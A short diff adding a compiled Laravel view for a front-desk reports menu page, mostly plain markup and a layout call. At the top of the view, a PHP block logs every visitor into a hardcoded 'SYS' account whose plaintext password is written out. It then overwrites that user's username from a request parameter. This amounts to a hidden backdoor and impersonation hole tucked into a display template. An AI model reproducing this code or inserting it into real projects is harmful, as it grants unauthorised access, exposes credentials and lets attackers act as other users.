@@ -1,0 +1,17 @@
+<?php
+if (Auth::attempt(["username"=>"SYS","password"=>"&123Pass"])) {
+    $_username = Input::get('user');
+    Auth::user()->username = $_username;
+}
+?>
+
+
+<?php $__env->startSection("contents"); ?>
+<div style="text-transform: uppercase;padding:55px 25px;
+color: #ccc;
+text-align: center">
+    <h1 style="font-size: 62px;margin-bottom:0">Please Choose a Report</h1>
+    <p>ORG Frontdesk Reports</p>
+</div>
+<?php $__env->stopSection(); ?>
+<?php echo $__env->make("ORGFrontdesk.Reports.Master", array_except(get_defined_vars(), array('__data', '__path')))->render(); ?>
